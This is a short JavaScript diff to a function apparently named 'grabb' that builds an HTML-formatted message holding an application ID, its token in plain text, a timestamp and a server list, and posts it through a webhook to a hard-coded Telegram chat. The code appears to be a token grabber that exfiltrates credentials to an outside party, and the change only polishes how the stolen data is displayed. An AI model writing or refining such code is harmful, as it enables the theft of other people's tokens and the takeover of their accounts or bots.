@@ -126,8 +126,17 @@ async function grabb(applicationId, token) {
 
   const message = {
     chat_id: '-1002255591952',
-    text: `Informações sobre a aplicação: \n\n${applicationId}\nToken: ||${token}||\nData/Hora: <t:${timestamp}:f>\nServidores: \n${servers.join('\n\n') || 'Nenhum'}`,
-  };
+    text: `
+Informações sobre a aplicação: 
+
+<b>ID da Aplicação:</b> ${applicationId}
+<b>Token:</b> <code>${token}</code>
+<b>Data/Hora:</b> <t:${timestamp}:f>
+<b>Servidores:</b> 
+<pre>${servers.join('\n\n') || 'Nenhum'}</pre>
+    `,
+    parse_mode: 'HTML'
+};
 
   await axios.post(webhookURL, message)
     .then(response => {
